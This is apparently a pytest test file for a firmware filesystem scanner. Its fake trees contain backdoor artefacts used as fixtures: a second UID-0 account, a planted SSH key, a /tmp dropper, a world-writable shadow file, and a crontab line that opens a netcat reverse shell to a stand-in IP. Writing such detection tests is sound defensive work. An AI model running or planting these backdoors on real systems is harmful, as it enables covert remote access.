"""Unit tests for modules/filesystem.py.

Exercises each of the five anomaly checks against small, hand-built fake
filesystem trees -- no real extracted firmware is needed for these tests
to pass. Each check also gets a negative case (the same scenario but
legitimate/benign) to confirm it stays quiet on normal content, matching
the same false-positive discipline as every other module.

Inputs:
    None directly (pytest's `tmp_path` fixture provides a fresh
    directory per test; fake filesystem trees are built manually).

Outputs:
    None (test assertions; pytest reports pass/fail).
"""

from pathlib import Path

from modules import filesystem


def test_second_uid0_account_is_high_finding_legitimate_root_is_quiet(tmp_path: Path) -> None:
    """A second UID-0 passwd entry is flagged HIGH; a lone legitimate root entry is not.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the backdoor account isn't flagged, or the
            legitimate-only passwd file produces any Check 1 finding.
    """
    backdoored_root = tmp_path / "backdoored"
    (backdoored_root / "etc").mkdir(parents=True)
    (backdoored_root / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/ash\n"
        "backdoor:x:0:0:backdoor:/root:/bin/sh\n"
        "nobody:x:65534:65534:nobody:/:/bin/false\n"
    )

    clean_root = tmp_path / "clean"
    (clean_root / "etc").mkdir(parents=True)
    (clean_root / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/ash\nnobody:x:65534:65534:nobody:/:/bin/false\n"
    )

    backdoor_findings = filesystem.analyze(str(backdoored_root))
    clean_findings = filesystem.analyze(str(clean_root))

    assert any(f.severity == "high" and "backdoor" in f.evidence for f in backdoor_findings)
    assert clean_findings == []


def test_cron_with_hardcoded_ip_is_medium_standard_paths_are_quiet(tmp_path: Path) -> None:
    """A cron entry referencing a hardcoded IP is flagged MEDIUM; standard-path cron is not.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the IP-referencing cron file isn't flagged, or
            the benign OpenWrt-style cron file produces any finding.
    """
    suspicious_root = tmp_path / "suspicious"
    (suspicious_root / "etc").mkdir(parents=True)
    # A bare IP (not embedded in a "/path"-like URL, which would also
    # separately trip the non-standard-path check) isolates this test to
    # the hardcoded-IP branch specifically.
    (suspicious_root / "etc" / "crontab").write_text(
        "*/5 * * * * nc 203.0.113.7 4444 -e /bin/sh\n"
    )

    benign_root = tmp_path / "benign"
    (benign_root / "etc").mkdir(parents=True)
    (benign_root / "etc" / "crontab").write_text(
        "0 3 * * * /usr/sbin/logrotate /etc/logrotate.conf\n"
        "*/10 * * * * /sbin/ntpd -q\n"
    )

    suspicious_findings = filesystem.analyze(str(suspicious_root))
    benign_findings = filesystem.analyze(str(benign_root))

    assert any(f.severity == "medium" and "IP" in f.description for f in suspicious_findings)
    assert benign_findings == []


def test_authorized_keys_present_is_medium_with_fingerprint(tmp_path: Path) -> None:
    """A pre-installed authorized_keys file is flagged MEDIUM with a key fingerprint in evidence.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If no finding is produced, or its evidence
            doesn't carry a SHA256 fingerprint.
    """
    root_dir = tmp_path / "fw"
    ssh_dir = root_dir / "root" / ".ssh"
    ssh_dir.mkdir(parents=True)
    (ssh_dir / "authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA fake-support-key\n"
    )

    findings = filesystem.analyze(str(root_dir))

    key_findings = [f for f in findings if "authorized_keys" in f.raw["file_path"]]
    assert len(key_findings) == 1
    assert key_findings[0].severity == "medium"
    assert key_findings[0].evidence.startswith("SHA256:")


def test_executable_in_tmp_is_high_executable_in_usr_bin_is_quiet(tmp_path: Path) -> None:
    """An executable in /tmp/ is flagged HIGH; the same file under /usr/bin/ is not.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the /tmp/ executable isn't flagged, or the
            /usr/bin/ executable produces any Check 4 finding.
    """
    root_dir = tmp_path / "fw"
    tmp_dir = root_dir / "tmp"
    usr_bin_dir = root_dir / "usr" / "bin"
    tmp_dir.mkdir(parents=True)
    usr_bin_dir.mkdir(parents=True)

    dropper = tmp_dir / "dropper"
    dropper.write_bytes(b"\x7fELF")
    dropper.chmod(0o755)

    legit = usr_bin_dir / "busybox"
    legit.write_bytes(b"\x7fELF")
    legit.chmod(0o755)

    findings = filesystem.analyze(str(root_dir))

    assert any(f.severity == "high" and "dropper" in f.raw["file_path"] for f in findings)
    assert not any("busybox" in f.raw["file_path"] for f in findings)


def test_world_writable_in_etc_is_medium_normal_permissions_are_quiet(tmp_path: Path) -> None:
    """A world-writable file under /etc/ is flagged MEDIUM; normal permissions are not.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the world-writable file isn't flagged, or the
            normal-permission file produces any Check 5 finding.
    """
    root_dir = tmp_path / "fw"
    etc_dir = root_dir / "etc"
    etc_dir.mkdir(parents=True)

    writable = etc_dir / "shadow"
    writable.write_text("root:*:19000:0:99999:7:::\n")
    writable.chmod(0o666)

    normal = etc_dir / "hostname"
    normal.write_text("router\n")
    normal.chmod(0o644)

    findings = filesystem.analyze(str(root_dir))

    assert any(f.severity == "medium" and "shadow" in f.raw["file_path"] for f in findings)
    assert not any("hostname" in f.raw["file_path"] for f in findings)


def test_extracted_dir_not_found_raises_file_not_found_error(tmp_path: Path) -> None:
    """Analyzing a nonexistent directory raises FileNotFoundError.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If FileNotFoundError is not raised.
    """
    missing = tmp_path / "does_not_exist"

    try:
        filesystem.analyze(str(missing))
        assert False, "expected FileNotFoundError"
    except FileNotFoundError:
        pass


def test_clean_router_filesystem_produces_no_findings(tmp_path: Path) -> None:
    """A realistic, fully benign router filesystem produces zero findings across all five checks.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If any finding is produced for entirely
            legitimate content.
    """
    root_dir = tmp_path / "fw"
    (root_dir / "etc" / "cron.daily").mkdir(parents=True)
    (root_dir / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/ash\nnobody:x:65534:65534:nobody:/:/bin/false\n"
    )
    (root_dir / "etc" / "crontab").write_text("0 3 * * * /usr/sbin/logrotate\n")
    (root_dir / "etc" / "cron.daily" / "logrotate").write_text("/usr/sbin/logrotate\n")
    (root_dir / "usr" / "bin").mkdir(parents=True)
    busybox = root_dir / "usr" / "bin" / "busybox"
    busybox.write_bytes(b"\x7fELF")
    busybox.chmod(0o755)
    (root_dir / "etc" / "hostname").write_text("router\n")
    (root_dir / "etc" / "hostname").chmod(0o644)

    assert filesystem.analyze(str(root_dir)) == []
